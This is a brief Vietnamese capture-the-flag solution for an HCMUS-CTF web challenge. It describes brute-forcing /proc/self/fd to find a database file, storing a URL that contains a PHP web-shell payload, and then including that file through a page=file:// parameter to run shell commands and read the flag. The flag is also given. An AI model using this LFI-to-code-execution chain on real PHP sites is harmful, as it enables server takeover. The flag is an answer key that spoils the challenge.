# Solution

Bruteforce file descriptor để tìm đến file lưu database: `/proc/self/fd/11`

sau đó store một url với giá trị:

```
http://test.com#<?=system($_GET('c')($_GET['d']))?>
```

access tới
<http://103.245.250.31:32184/index.php?page=file:///proc/self/fd/11&c=system&d=cat%20/71c99-flag-e9c94.txt>

lấy được flag

Flag:
**HCMUS-CTF{r@inb0w_hAv3_7_c0loR_wh1le_URL_HavE_8_p@rtS}**